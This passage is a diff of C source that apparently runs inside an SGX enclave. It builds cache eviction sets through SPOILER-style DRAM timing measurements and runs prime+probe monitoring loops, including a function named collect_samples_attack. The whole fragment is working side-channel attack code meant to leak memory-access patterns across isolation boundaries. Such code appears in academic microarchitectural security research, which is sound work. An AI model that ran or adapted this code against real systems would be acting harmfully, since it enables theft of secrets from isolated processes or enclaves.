+    ///Now reduce the set
+
+    //randomize_set(filtered_set, cont1);
+    long int filtered_set1[cont1];
+    int min_set[cont1];
+    //long int ttest;
+
+    int ch = 0, cont2 = 0;
+    for (l = 0; l < cont1; l++)
+    {
+        min_set[l] = l;
+        filtered_set1[l] = 0;
+    }
+    k = 0;
+    num_sets = cont1;
+    last_red = cont1;
+    stuck = 0;
+    while (num_sets > CACHE_SET_SIZE)
+    {
+        k++;
+        k = k % cont1;
+        while (min_set[k] == -1)
+        {
+            k++;
+            k = k % cont1;
+        }
+        //Check for stuck and repeat
+        if (last_red != num_sets)
+        {
+            stuck++;
+            if (stuck > cont1 + 2 * CACHE_SET_SIZE)
+            {
+                for (l = 0; l < cont1; l++)
+                {
+                    min_set[l] = l;
+                    filtered_set1[l] = 0;
+                }
+                if (DEBUG)
+                {
+                    printf("Final %i %i %i \n", cont2, v, ch);
+                }
+                randomize_set(filtered_set, cont1);
+                num_sets = cont1;
+                stuck = 0;
+                ch++;
+                if (ch > 20)
+                {
+                    goto LAB;
+                }
+            }
+            last_red = num_sets;
+        }
+        else
+        {
+            stuck--;
+            if (stuck < 0)
+            {
+                stuck = 0;
+            }
+        }
+        cont2 = 0;
+        v = 0;
+        min_set[k] = -1;
+        num_sets--;
+        last_red--;
+        for (l = 0; l < cont1; l++)
+        {
+            //Check for the reduction
+            if (min_set[l] >= 0)
+            {
+                filtered_set1[cont2] = filtered_set[l];
+                cont2++;
+            }
+        }
+        for (l = 0; l < 100; l++)
+        {
+            //ttest = calibrate_miss((long int *)test_address);
+            //lfence();
+            //flush_desired_set(filtered_set, cont1);
+            //lfence();
+            tmes = probe_candidate_flush(cont2, filtered_set1, (long int *)test_address);
+            if (tmes > TIME_FLUSH)
+            {
+                v++;
+            }
+            //lfence();
+            //flush_data((long int *)test_address);
+        }
+        //printf("v %i %i\n",v,cont2);
+        //printf("%li \n",ttest);
+        if (DEBUG)
+        {
+            printf("Final %i %i %i %i %i %i %i %i\n", cont1, tmes, cont2, k, v, num_sets, ch, stuck);
+        }
+        if (v < 90)
+        {
+            min_set[k] = k;
+            num_sets++;
+            //printf("Tested %i %i %i \n", k, v, num_sets);
+            //ch++;
+        }
+        else
+        {
+            if (cont2 == CACHE_SET_SIZE)
+            {
+                printf("Ops!! \n");
+            }
+        }
+    }
+    v = 0;
+    for (l = 0; l < 2000; l++)
+    {
+        tmes = probe_candidate_flush(CACHE_SET_SIZE, filtered_set1, (long int *)test_address);
+        if (tmes > TIME_FLUSH)
+        {
+            v++;
+        }
+        //printf("%i ", tmes);
+    }
+    printf("\n %i \n", v);
+    for (l = 0; l < CACHE_SET_SIZE; l++)
+    {
+        ev_set[index * CACHE_SET_SIZE + l] = filtered_set1[l];
+        //printf("%lx ", filtered_set1[l]);
+    }
+    return 0;
+    //printf("\n");
+}
+
+void complete_eviction_set(int orig_cont, long int t_address, int red_set[SPOILER_SETS], int pre_red_set[SPOILER_SETS],
+                           long int evic_add[CACHE_SLICES], long int evict_set[CACHE_SLICES * CACHE_SET_SIZE], int index,
+                           long int big_ev_set[MONITORED_SETS * CACHE_SLICES * CACHE_SET_SIZE], int lcont)
+{
+    int i = 1;
+    int j = 0, v = 0;
+    int k = 1, l = 0;
+    int k1 = 1;
+    int tmes, res, cont;
+    int start_set = 20;
+    cont = orig_cont;
+    long int test_address = t_address;
+    long int old_address = t_address;
+    long int test_address1;
+    int st = 0;
+    printf("Test complete address %lx \n", test_address);
+    int valid = 1;
+    int ind = index;
+    while (i < CACHE_SLICES)
+    {
+    NEW_ADD:
+        valid = 1;
+        while (valid)
+        {
+            test_address1 = array_addresses[ind][j];
+            if ((!check_inside(test_address1, evic_add, i)) && (!check_inside(test_address1, evict_set, i * CACHE_SET_SIZE)))
+            {
+                if (test_address1 != 0)
+                {
+                    valid = 0;
+                    test_address = test_address1;
+                }
+                else
+                {
+                    test_address1 = 0;
+                    while (test_address1 == 0)
+                    {
+                        test_address1 = array_addresses[ind][k1];
+                        if ((!check_inside(test_address1, evic_add, i)) && (!check_inside(test_address1, evict_set, i * CACHE_SET_SIZE)))
+                        {
+                            if (test_address1 != 0)
+                            {
+                                j = SPOILER_PEAKS;
+                                test_address = test_address1;
+                            }
+                            else
+                            {
+                                k1 = 0;
+                                test_address1 = 0;
+                            }
+                        }
+                        else
+                        {
+                            test_address1 = 0;
+                        }
+                        k1++;
+                        k1 = k1 % (SPOILER_PEAKS);
+                    }
+                }
+            }
+            j++;
+            if (j >= (SPOILER_PEAKS))
+            {
+                st++;
+                if (st > 10){
+                    for (st=ind+1;st<SPOILER_PEAKS;st++)
+                    {
+                        if(red_set[st]!=(-1)){
+                            ind = st;
+                            break;
+                        }
+                    }
+                    st = 0;
+                    printf("New index %i \n",ind);
+                    j = 0;
+                    goto NEW_ADD;
+                }
+                v = 0;
+                while (v < 900)
+                {
+                    get_reduced_set(red_set, pre_red_set, test_address, 6, ind, start_set);
+                    v = test_selection(1000, red_set, &cont, old_address);
+                    printf("V %i %i %lx %i %i\n", v, k1, test_address, start_set,ind);
+                    start_set++;
+                    start_set = start_set % SPOILER_SETS;
+                    mfence();
+                    lfence();
+                    v = test_selection(1000, red_set, &cont, old_address);
+                    /* if (v > 900)
+                    {
+                        for (k = 0; k < SPOILER_SETS; k++)
+                        {
+                            if (red_set[(ind + SPOILER_SETS - k - 1) % SPOILER_SETS] >= 0)
+                            {
+                                ind = k;
+                                break;
+                            }
+                        }
+                    } */
+                    l++;
+                    if (l > 2)
+                    {
+                        test_address1 = 0;
+                        while (test_address1 == 0)
+                        {
+                            k1++;
+                            k1 = k1 % (SPOILER_PEAKS);
+                            test_address1 = array_addresses[ind][k1];
+                            if ((!check_inside(test_address1, evic_add, i)) && (!check_inside(test_address1, evict_set, i * CACHE_SET_SIZE)))
+                            {
+                                if (test_address1 != 0)
+                                {
+                                    j = SPOILER_PEAKS;
+                                    test_address = test_address1;
+                                }
+                                else
+                                {
+                                    k1 = 0;
+                                    test_address1 = 0;
+                                }
+                            }
+                            else
+                            {
+                                test_address1 = 0;
+                            }
+                        }
+                        l = 0;
+                    }
+                }
+                j = 0;
+            }
+            j = j % (SPOILER_PEAKS);
+        }
+        printf("Test address %lx %i %i \n", test_address, i, j);
+        //first check if it is evicted with the current eviction set (the complete one)
+        v = 0;
+        for (l = 0; l < 2000; l++)
+        {
+            tmes = probe_candidate_flush(lcont * CACHE_SET_SIZE * CACHE_SLICES, big_ev_set, (long int *)test_address);
+            if (tmes > TIME_FLUSH)
+            {
+                v++;
+            }
+        }
+        if (v > 200)
+        {
+            printf("Other set new %i\n", v);
+            goto NEW_ADD;
+        }
+        //first check if it is evicted with the current eviction set
+        v = 0;
+        for (l = 0; l < 2000; l++)
+        {
+            tmes = probe_candidate_flush(i * CACHE_SET_SIZE, evict_set, (long int *)test_address);
+            if (tmes > TIME_FLUSH)
+            {
+                v++;
+            }
+        }
+        if (v > 200)
+        {
+            printf("Goto new %i\n", v);
+            goto NEW_ADD;
+        }
+        printf("Valid %i\n", v);
+        v = 0;
+        k = 0;
+        while (v < 1500)
+        {
+            v = 0;
+            res = get_min_set(test_address, cont, evict_set, i);
+            if (res != 0)
+            {
+                goto NEW_ADD;
+            }
+            printf("Valid\n");
+            for (l = 0; l < 2000; l++)
+            {
+                tmes = probe_candidate_flush((i + 1) * CACHE_SET_SIZE, evict_set, (long int *)test_address);
+                if (tmes > TIME_FLUSH)
+                {
+                    v++;
+                }
+                //printf("%i ", tmes);
+            }
+            printf("The simp go to %i %i %i\n", v, i, k);
+            k++;
+            if (k > 20)
+            {
+                goto NEW_ADD;
+            }
+        }
+        evic_add[i] = test_address;
+        i++;
+    }
+}
+
+void gen_plot(int rounds)
+{
+    int i, j, k, c, c1, p;
+    int stuck = 0;
+    int num_peaks = 0;
+    int peak_count = 0;
+    int chunk = 13;
+    int repetitions = 1000;
+    //int candidates[rounds] = {0};
+    long int peaks[1024] = {0};
+    int exits[1024] = {0};
+    long int candidates[1024] = {0};
+    //int candidates_count[lim] = {0};
+    long int t;
+    int ini_border = 0;
+    int ini = 0 * RESERVED_RAM;
+    int lim = 1 * RESERVED_RAM;
+    long int max = 0;
+    double mean = 0.0;
+    double prev_mean = 475.5;
+    double mar = MARGIN;
+    double d;
+    //int border_ant = 0;
+    ////int border_conf = 0;
+
+    //ini = 0x1000;
+
+    for (k = 1; k <= 1; k++)
+    {
+        /*Important! start in a physical address ending in 0xFC0*/
+        //lim = 2 * 4*1024*1024;
+        //ini = 1 * 4*1024*1024;
+    STT:
+        num_peaks = 0;
+        //ini = 0x1000;
+        for (i = ini; i < ini + 0xFFF; i++)
+        {
+            if ((((long int)(&memory_map[i])) & 0xFFF) == 0xFC0)
+            {
+                ini = i;
+                break;
+            }
+        }
+        //ini = RESERVED_RAM + 0xFC0;
+
+        for (j = 0; j < 1000; j++)
+        {
+            candidates[j] = 0;
+        }
+        printf("Starting at: %i %lx %lx\n", i, (&memory_map[ini]), (&memory_map[ini + 64]));
+        j = 0;
+        while (j < rounds)
+        //for (j = 0; j < rounds; j++)
+        {
+            max = 0;
+            c = 0;
+            for (i = ini; i < lim; i += 4096)
+            {
+                //candidates_count[i]=0;
+                get_eax();
+                t = hammer((long int *)&memory_map[i], (long int *)&memory_map[i + 64], repetitions);
+                lfence();
+                mfence();
+                exits[c] = get_eax();
+                d = (t / repetitions);
+                if ((t > max) && (d < 2000))
+                {
+                    max = t;
+                    ram_border = i + 64;
+                    ///border_conf = i;
+                }
+                //printf("%i %i \n",c,(i + 64) >> 12);
+                if (d > (prev_mean + mar))
+                {
+                    candidates[c]++;
+                }
+                mean += d;
+                peaks[c] = (long int)d;
+                c++;
+                //t=access_timed((long int*) &memory_map[i]);
+                //printf("Map %i %li %lx %lx %i %li\n", (i >> 12), t / 100, &memory_map[i], &memory_map[i + 128], ram_border, global_counter);
+                //printf("Map %i %li %li\n", (i >> 12), t / repetitions, t);
+            }
+            c1 = 0;
+            mean = mean / c;
+            mar = (max / repetitions) - mean - 30.0;
+            //mar = 50.0;
+            //printf("%f \n",mar);
+            prev_mean = mean;
+            if (mean < 260)
+            {
+                //ini = 0x1000;
+                //ini_border += 0x1000;
+                //if (ini_border > (RESERVED_MEMORY-RESERVED_RAM))
+                //{
+                //    ini_border=0;
+                //}
+                prev_mean = 270;
+                //ini = ini_border;
+                //lim = ini + RESERVED_RAM;
+                //goto STT;
+            }
+            //prev_mean = mean;
+            int cext = 0;
+            for (i = 0; i < 1024; i++)
+            {
+                //printf("%i ",exits[i]);
+                cext += exits[i];
+                if (peaks[i] > (prev_mean + mar))
+                {
+                    c1++;
+                    //printf("%i ", i);
+                    printf("%i %f %f\n", i, peaks[i] - mean, prev_mean);
+                }
+            }
+            printf("cext %i\n", cext);
+            if ((c1 < 6) && (c > 0))
+            {
+                p = ((ram_border) >> 12) % 1024;
+                printf("maxMean %f %i %i %f %i\n", (max / repetitions) - mean, (ram_border) >> 12, candidates[p], mean, num_peaks);
+                candidates[p]++;
+                j = candidates[p];
+                stuck = 0;
+                if (c1 == 1)
+                {
+                    num_peaks--;
+                    if (num_peaks < 0)
+                        num_peaks = 0;
+                }
+                else
+                {
+                    num_peaks++;
+                    if (num_peaks >= 100)
+                    {
+                        peak_count++;
+                        ini = peak_count * 1024 * 1024;
+                        //ini = peak_count * RESERVED_RAM;
+                        ini += ini_border;
+                        lim = ini + RESERVED_RAM;
+                        if (lim > RESERVED_MEMORY)
+                        {
+                            ini = ini_border;
+                            //ini = 0x1000;
+                            lim = ini + RESERVED_RAM;
+                            peak_count = -1;
+                        }
+                        goto STT;
+                    }
+                }
+            }
+            else
+            {
+                stuck++;
+                num_peaks++;
+                if ((stuck > 300) || (num_peaks >= 100))
+                {
+                    printf("Stuck \n");
+                    if (prev_mean == 270)
+                    {
+                        ini_border ^= 0x1000;
+                        if (ini_border > (RESERVED_MEMORY - RESERVED_RAM))
+                        {
+                            ini_border = 0;
+                        }
+                        //prev_mean = 400;
+                        ini = ini_border;
+                        lim = ini + RESERVED_RAM;
+                        goto STT;
+                    }
+                    //printf("Stuck \n");
+                    peak_count++;
+                    //ini = peak_count * RESERVED_RAM;
+                    ini = peak_count * 1024 * 1024;
+                    ini += ini_border;
+                    lim = ini + RESERVED_RAM;
+                    if (ini > RESERVED_MEMORY)
+                    {
+                        ini = 0;
+                        lim = ini + RESERVED_RAM;
+                        peak_count = -1;
+                    }
+                    stuck = 0;
+                    goto STT;
+                }
+            }
+            //printf("Candidate %i %i \n", memory_map[ram_border], (ram_border) >> 12);
+            //candidates_count[ram_border]=1;
+        }
+        printf("Final candidates\n");
+
+        for (j = 0; j < 1024; j++)
+        {
+            if (candidates[j] > rounds / 2)
+            {
+                printf("%i ", j);
+            }
+        }
+        printf("\n");
+        //border_ant = ram_border;
+        printf("Ram border %i %i %i %i\n", (ram_border) >> 12, ram_border, (ini >> 12), (lim >> 12));
+    }
+
+    //build_ev_set(TEST_SET);
+
+    // For testing the value of the previous one
+    ini = (ram_border)&0x00000FFF;
+    //ram_border = ram_border - 64;
+    int val = (ram_border - ini) >> 12;
+    val--;
+
+    printf("Origintal value %i %i %lx\n", val, ini, &memory_map[ram_border]);
+    uint32_t rd;
+    sgx_read_rand((unsigned char *)&rd, 4);
+    int offset = OFFSET;
+    offset = offset * 64;
+    int res = 0;
+    //Build a "test set"
+    int cont = 0, v = 0;
+    int tmes = 0;
+    int start_set = 20;
+    int l = 0;
+
+    res = build_array(val, ini, offset, 100);
+    printf("Res %i \n", res);
+    while (res == 0)
+    {
+        sgx_read_rand((unsigned char *)&rd, 4);
+        offset = OFFSET;
+        offset = offset * 64;
+        res = build_array(val, ini, offset, 100);
+    }
+    int reduced_set[SPOILER_SETS];
+    int pre_reduced_set[SPOILER_SETS];
+    for (l = 0; l < SPOILER_SETS; l++)
+    {
+        pre_reduced_set[l] = l;
+    }
+    printf("DATA %i %i %i\n", val, ini, offset);
+
+    //Build the evictions sets,
+
+    //FOR THE FIRST ADDRESS
+    int set_num = val;
+    int ind = 0;
+    long int ev_set_test[CACHE_SLICES * CACHE_SET_SIZE];
+    long int add_lim[CACHE_SLICES];
+    int crep = 0;
+    while (crep < MONITORED_SETS)
+    //for (set_num = val; set_num < val + MONITORED_SETS; set_num++)
+    {
+        if (pre_reduced_set[ind] >= 0)
+        {
+            //FOR THE SECOND ADDRESS
+            printf("Build eviction set %i %i\n", ind, crep);
+            long int test_address = (long int)(&memory_map[set_num * PAGE_SIZE + ini + offset]);
+            printf("Addresses %lx %lx %i %i\n", test_address, (long int)(&memory_map[set_num * PAGE_SIZE + ini]), offset, val);
+            printf("Origintal value %i %i %lx\n", val, ini, &memory_map[ram_border]);
+
+            for (k = 0; k < CACHE_SLICES * CACHE_SET_SIZE; k++)
+            {
+                ev_set_test[k] = 0;
+            }
+
+        BAD_SPOT:
+            v = 0;
+            get_reduced_set(reduced_set, pre_reduced_set, test_address, 6, ind, start_set);
+            start_set++;
+            v = test_selection(1000, reduced_set, &cont, test_address);
+            while (v < 900)
+            {
+                printf("Bad Spot \n");
+                get_reduced_set(reduced_set, pre_reduced_set, test_address, 6, ind, start_set);
+                v = test_selection(1000, reduced_set, &cont, test_address);
+                start_set++;
+                start_set = start_set % SPOILER_SETS;
+            }
+
+            while (v < 1500)
+            {
+                res = get_min_set(test_address, cont, ev_set_test, 0);
+                if (res != 0)
+                {
+                    goto BAD_SPOT;
+                }
+                v = 0;
+                for (l = 0; l < 2000; l++)
+                {
+                    tmes = probe_candidate_flush(CACHE_SET_SIZE, ev_set_test, (long int *)test_address);
+                    if (tmes > TIME_FLUSH)
+                    {
+                        v++;
+                    }
+                    //printf("%i ", tmes);
+                }
+                printf("The final test goes to %i \n", v);
+            }
+            printf("The final test goes to %i \n", v);
+            add_lim[0] = test_address;
+            //Repeat for each of the ways
+            complete_eviction_set(cont, test_address, reduced_set, pre_reduced_set, add_lim, ev_set_test, ind, eviction_set, crep);
+            //Remove the data belonging to those sets from the
+            filter_spoiler(reduced_set, pre_reduced_set, ev_set_test);
+
+            memcpy(&(eviction_set[crep * CACHE_SLICES * CACHE_SET_SIZE]), ev_set_test, (CACHE_SLICES * CACHE_SET_SIZE) * sizeof(long int));
+            memcpy(&(eviction_add[crep * CACHE_SLICES]), add_lim, (CACHE_SLICES) * sizeof(long int));
+            crep++;
+        }
+        //Increase the index value
+        ind++;
+        set_num++;
+    }
+
+    for (i = 0; i < MONITORED_SETS * CACHE_SLICES; i++)
+    {
+        for (j = 0; j < CACHE_SET_SIZE; j++)
+        {
+            printf("%lx ", eviction_set[i * CACHE_SET_SIZE + j]);
+        }
+        printf("\n");
+    }
+
+    /* 
+    //FOR THE SECOND ADDRESS
+    printf("Build second eviction set \n");
+    //ram_border = ram_border + 64;
+    val = val + 1;
+    //ini = (ram_border)&0x00000FFF;
+    test_address = (long int)(&memory_map[val * PAGE_SIZE + ini + offset]);
+    printf("Addresses %lx %lx %i\n", test_address, (long int)(&memory_map[val * PAGE_SIZE + ini]), offset);
+    printf("Origintal value %i %i %lx\n", val, ini, &memory_map[ram_border]);
+    start_set = 20;
+BAD_SPOT1:
+    v = 0;
+    get_reduced_set(reduced_set, test_address, 6, 1, start_set);
+    v = test_selection(1000, reduced_set, &cont, test_address);
+
+    while (v < 900)
+    {
+        get_reduced_set(reduced_set, test_address, 6, 1, start_set);
+        v = test_selection(1000, reduced_set, &cont, test_address);
+        start_set++;
+        start_set = start_set % SPOILER_SETS;
+    }
+
+    while (v < 1500)
+    {
+        res = get_min_set(test_address, cont, eviction_set_1, 0);
+        if (res != 0)
+        {
+            goto BAD_SPOT1;
+        }
+        v = 0;
+        for (l = 0; l < 2000; l++)
+        {
+            tmes = probe_candidate_flush(CACHE_SET_SIZE, eviction_set_1, (long int *)test_address);
+            if (tmes > TIME_FLUSH)
+            {
+                v++;
+            }
+            //printf("%i ", tmes);
+        }
+        printf("The final test goes to %i \n", v);
+    }
+    printf("The final test goes to %i \n", v);
+    eviction_add_1[0] = test_address;
+
+    //Repeat for each of the ways
+    complete_eviction_set(cont, test_address, reduced_set, eviction_add_1, eviction_set_1, 1); */
+
+    build_ev_set(OFFSET, eviction_set, eviction_set_1, final_eviction_set, mon_ways);
+    //gen_tlb();
+    pthread_mutex_lock(&mutex_start);
+    monitor_ready = 1;
+    pthread_mutex_unlock(&mutex_start);
+    pthread_cond_signal(&condp);
+    printf("Done\n");
+}
+
+/*
+ * Monitor aux function
+ *
+ */
+
+/* void collect_samples_cache(long int address, long int samples[SAMPLES_SIZE * MONITORED_SETS * WAYS_FILLED * CACHE_SLICES],
+                           size_t s_rip[SAMPLES_SIZE * MONITORED_SETS * WAYS_FILLED * CACHE_SLICES], int s_exit[SAMPLES_SIZE * MONITORED_SETS * WAYS_FILLED * CACHE_SLICES],
+                           long int s_time[SAMPLES_SIZE * MONITORED_SETS * WAYS_FILLED * CACHE_SLICES])
+{
+    int i;
+    if (FULL_SET)
+    {
+        int j = 0;
+        for (i = 0; i < 2 * SAMPLES_SIZE * WAYS_FILLED * CACHE_SLICES; i++)
+        {
+            long int begin = final_eviction_set[(j % (2 * CACHE_SLICES)) * CACHE_SET_SIZE];
+            s_time[i] = global_counter - timeini;
+            timeini = global_counter;
+            samples[i] = prime_ev_set(begin);
+            //access_timed(begin, &samples[i]);
+            //begin = (long int *)(*begin);
+            s_rip[i] = get_rip();
+            lfence();
+            s_exit[i] = get_eax();
+            j++;
+            //mem_access((long int *)eviction_add[i % CACHE_SLICES]);
+        }
+    }
+    else
+    {
+        long int *begin = (long int *)address;
+        prime_ev_set(address);
+        prime_ev_set(address);
+        mfence();
+        for (i = 0; i < 2 * SAMPLES_SIZE * WAYS_FILLED * CACHE_SLICES; i++)
+        {
+            s_time[i] = global_counter - timeini;
+            timeini = global_counter;
+            access_timed(begin, &samples[i]);
+            begin = (long int *)(*begin);
+            s_rip[i] = get_rip();
+            lfence();
+            s_exit[i] = get_eax();
+            //mem_access((long int *)eviction_add[i % CACHE_SLICES]);
+        }
+    }
+} */
+
+//int s_exit[SAMPLES_SIZE * MONITORED_SETS * WAYS_FILLED * CACHE_SLICES]
+void collect_samples_cache(long int address, long int samples[SAMPLES_SIZE * MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES],
+                           size_t s_rip[SAMPLES_SIZE * MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES])
+{
+    int i, k = 0;
+    if (FULL_SET)
+    {
+        int j = 0;
+        //Prefetch
+        for (i = 0; i < MONITORED_SETS * CACHE_SLICES; i++)
+        {
+            long int begin = final_eviction_set[(i * CACHE_SET_SIZE)];
+            prime_ev_set(begin);
+        }
+        for (i = 0; i < MONITORED_SETS * SAMPLES_SIZE * CACHE_SET_SIZE * CACHE_SLICES; i++)
+        {
+            long int begin = final_eviction_set[(j * CACHE_SET_SIZE) % (MONITORED_SETS * CACHE_SLICES * CACHE_SET_SIZE)];
+            samples[i] = prime_ev_set(begin);
+            //access_timed(begin, &samples[i]);
+            //begin = (long int *)(*begin);
+            s_rip[i] = get_rip();
+            lfence();
+            get_eax();
+            j++;
+            //mem_access((long int *)eviction_add[i % CACHE_SLICES]);
+        }
+    }
+    else
+    {
+        long int *begin = (long int *)address;
+        prime_ev_set(address);
+        prime_ev_set(address);
+	//prime_ev_set(address);
+        lfence();
+        mfence();
+        if (CONTINUOS && (mon_ways<=8))
+        {
+            long int ts;
+            while(1)
+            {
+                access_timed(begin, &ts);
+                begin = (long int *)(*begin);
+                if ((i % MON_WINDOW) == 0)
+                {
+                    get_rip();
+                    lfence();
+                    get_eax();
+                }
+                i++;
+                //mem_access((long int *)eviction_add[i % CACHE_SLICES]);
+            }
+        }
+        else
+        {
+            for (i = 0; i < MONITORED_SETS * SAMPLES_SIZE * CACHE_SET_SIZE * CACHE_SLICES; i++)
+            {
+                access_timed(begin, &samples[i]);
+                begin = (long int *)(*begin);
+                if ((i % MON_WINDOW) == 0)
+                {
+                    s_rip[k] = get_rip();
+                    lfence();
+                    get_eax();
+                    k++;
+                }
+                //mem_access((long int *)eviction_add[i % CACHE_SLICES]);
+            }
+        }
+    }
+}
+
+void collect_samples_attack(long int address)
+{
+    long int s[MON_WINDOW];
+    size_t s_r[MON_WINDOW];
+    long int s_t[MON_WINDOW];
+    int i;
+    if (FULL_SET)
+    {
+        int j = 0;
+        //Prefetch
+        for (i = 0; i < MONITORED_SETS * CACHE_SLICES; i++)
+        {
+            long int begin = final_eviction_set[(i * CACHE_SET_SIZE)];
+            prime_ev_set(begin);
+        }
+        i = 0;
+        while (1)
+        {
+            long int begin = final_eviction_set[(j * CACHE_SET_SIZE) % (MONITORED_SETS * CACHE_SLICES * CACHE_SET_SIZE)];
+            s_t[i] = global_counter - timeini;
+            timeini = global_counter;
+            s[i] = prime_ev_set(begin);
+            s_r[i] = get_rip();
+            lfence();
+            j++;
+            i = (i + 1) % MON_WINDOW;
+            //mem_access((long int *)eviction_add[i % CACHE_SLICES]);
+        }
+    }
+    else
+    {
+        i = 0;
+        long int *begin = (long int *)address;
+        prime_ev_set(address);
+        prime_ev_set(address);
+        mfence();
+        while (i< (REPS*200)*(MONITORED_SETS * SAMPLES_SIZE * CACHE_SET_SIZE * CACHE_SLICES))
+        {
+	    access_timed(begin, &s[0]);
+	    begin = (long int *)(*begin);
+	    if ((i % MON_WINDOW) == 0)
+            {
+                get_rip();
+                lfence();
+	        get_eax();
+ 	    }
+            i++;
+        }
+    }
+}
+
+void collect_samples_tlb(long int pos_data, long int s_tlb[SAMPLES_SIZE * EV_SET_SIZE], size_t s_rip[SAMPLES_SIZE * EV_SET_SIZE], int s_exit[SAMPLES_SIZE * EV_SET_SIZE], long int s_time[SAMPLES_SIZE * EV_SET_SIZE])
+//, long int samples_tlb[SAMPLES_SIZE * EV_SET_SIZE])
+{
+    int i;
+    long int *begin = (long int *)pos_data;
+    //long int t1;
+    for (i = 0; i < SAMPLES_SIZE * EV_SET_SIZE; i++)
+    {
+        s_time[i] = global_counter - timeini;
+        timeini = global_counter;
+        access_timed(begin, &s_tlb[i]);
+        begin = (long int *)(*begin);
+        s_rip[i] = get_rip();
+        lfence();
+        s_exit[i] = get_eax();
+        //address = (long int *)access_timed(address, &t1);
+        //printf("Tim %li %lx\n", t1, address);
+        //samples_tlb[i]=(long int)address;
+    }
+}
+
+void collect_samples_set(long int address, long int s_tlb[SAMPLES_SIZE * EV_SET_SIZE], size_t s_rip[SAMPLES_SIZE * EV_SET_SIZE], int s_exit[SAMPLES_SIZE * EV_SET_SIZE], long int s_time[SAMPLES_SIZE * EV_SET_SIZE])
+{
+    int i;
+    //long int t1;
+    for (i = 0; i < SAMPLES_SIZE * EV_SET_SIZE; i++)
+    {
+        s_time[i] = global_counter - timeini;
+        timeini = global_counter;
+        s_tlb[i] = prime_ev_set(address);
+        s_rip[i] = get_rip();
+        lfence();
+        s_exit[i] = get_eax();
+        //samples_time[i] = timeini;
+    }
+}
+
+/*
+ * Monitor function
+ */
+
+void *monitor_sets_old(void *)
+{
+    int i, j = 0;
+    pthread_mutex_lock(&mutex_start);
+    sampler_ready = 0;
+    pthread_mutex_unlock(&mutex_start);
+    long int address = final_eviction_set[0];
+    if (ATTACK)
+    {
+        collect_samples_attack(address);
+    }
+    else
+    {
+        while (j < REPS)
+        {
+            collect_samples_cache(address, samples_data, samples_rip);
+            if (DEBUG_CACHE)
+            {
+                if ((INTERLEAVED) || (FULL_SET))
+                {
+                    int k;
+                    for (i = 0; i < SAMPLES_SIZE * mon_ways; i++)
+                    {
+                        printf("Tim ");
+                        for (k = 0; k < 2 * CACHE_SLICES; k++)
+                        {
+                            printf("%li %zx ", samples_data[i * CACHE_SLICES + k], samples_rip[i * CACHE_SLICES + k]);
+                        }
+                        printf("%i %i \n", j, i);
+                    }
+                }
+                else
+                {
+                    for (i = 0; i < 2 * SAMPLES_SIZE * mon_ways * CACHE_SLICES; i++)
+                    {
+                        printf("Tim %li %zx %i %i \n", samples_data[i], samples_rip[i], j, i);
+                    }
+                }
+            }
+            j++;
+        }
+    }
+
+    pthread_mutex_lock(&mutex_start);
+    sampler_ready = 1;
+    pthread_mutex_unlock(&mutex_start);
+    pthread_cond_signal(&condSets);
+}
+
+/*
+ * Monitor function for output
+ */
+
+void *monitor_sets_file(void *)
+{
+    int i, j = 0, cont = 0;
+    long int address = final_eviction_set[0];
+    prime_ev_set(address);
+    prime_ev_set(address);
+    pthread_mutex_lock(&mutex_start);
+    sampler_ready = 0;
+    pthread_mutex_unlock(&mutex_start);
+    while (j < REPS)
+    {
+        printFile("Start profile %li ", global_counter);
+        collect_samples_cache(address, samples_data, samples_rip);
+        printFile("End profile %li ", global_counter);
+        if ((INTERLEAVED) || (FULL_SET))
+        {
+            int k;
+            int cx;
+            int cx2;
+            int val;
+            int lim = (MONITORED_SETS * SAMPLES_SIZE * CACHE_SET_SIZE * CACHE_SLICES) -
+                      (MONITORED_SETS * SAMPLES_SIZE * CACHE_SET_SIZE * CACHE_SLICES) % MON_WINDOW;
+            for (i = 0; i < lim; i += MON_WINDOW)
+            {
+                //printFile("Tim ");
+                cont = 0;
+                cx = 0;
+                cx2 = 0;
+                char buf[MON_WINDOW * (sizeof(int) + 1)];
+                char buf_long[MON_WINDOW * (sizeof(long int) + 1)];
+                for (k = 0; k < MON_WINDOW; k++)
+                {
+                    //if ((samples_rip[int(i + k]) != 0)
+                    //{
+                    //    cont++;
+                    //}
+                    cont = (int)samples_rip[int(i / MON_WINDOW)];
+                    val = -1;
+                    if (samples_data[i + k] != 0)
+                    {
+                        if (samples_data[i + k] > (TIME_FLUSH+50))
+                        {
+                            val = 1;
+                        }
+                        else
+                        {
+                            val = 0;
+                        }
+                    }
+                    cx += snprintf(buf + cx, MON_WINDOW * (sizeof(int) + 1) - cx - 1, "%d ", val);
+                    cx2 += snprintf(buf_long + cx2, MON_WINDOW * (sizeof(long int) + 1) - cx2 - 1, "%lu ", samples_data[i + k]);
+                    //printFile("Tim %li %zx %lu ", samples_data[i * CACHE_SLICES + k], samples_rip[i * CACHE_SLICES + k], samples_time[i * CACHE_SLICES + k]);
+                }
+                printFile("Tim %s tim %s cont %i %i cx %i", buf, buf_long, cont, j, cx);
+                //printFile("%i %i ", j, i);
+            }
+        }
+        else
+        {
+            for (i = 0; i < MONITORED_SETS * SAMPLES_SIZE * mon_ways * CACHE_SLICES; i++)
+            {
+                printFile("Tim %li %zx %i %i \n", samples_data[i], samples_rip[i], j, i);
+            }
+        }
+        j++;
+    }
+    pthread_mutex_lock(&mutex_start);
+    sampler_ready = 1;
+    pthread_mutex_unlock(&mutex_start);
+    pthread_cond_signal(&condSets);
+
+    /* pthread_cancel(counter_task);
+    pthread_mutex_lock(&global_mutex);
+    monitor_running = 0;
+    pthread_mutex_unlock(&global_mutex); */
+}
+
+/*
+ * Monitor function
+ */
+
+void *monitor_sets(void *)
+{
+    int i, j;
+    //long int *address = (long int *)eviction_set_tlb[0];
+    long int address = eviction_set_tlb[0];
+    //int cont;
+    j = REPS + 10;
+    while (j < REPS)
+    {
+        //collect_samples_set(address, samples_tlb, samples_rip, samples_exit, samples_time);
+        //collect_samples_tlb(address, samples_tlb, samples_rip, samples_exit, samples_time);
+        if (DEBUG)
+        {
+            for (i = 0; i < SAMPLES_SIZE * EV_SET_SIZE; i++)
+            {
+                //cont = i % (EV_SET_SIZE);
+                //if (cont == 0)
+                //{
+                //    printf("\n Tim ");
+                //}
+                printf("Tim %li %zx \n", samples_tlb[i], samples_rip[i]);
+            }
+        }
+        j++;
+    }
+}
+
+void printf_helloworld()
+{
+    mon_ways = WAYS_FILLED;
+    //Info about the thread reading SSA
+    thread_data = get_thread_data();
+    regs = (size_t *)(thread_data->first_ssa_gpr);
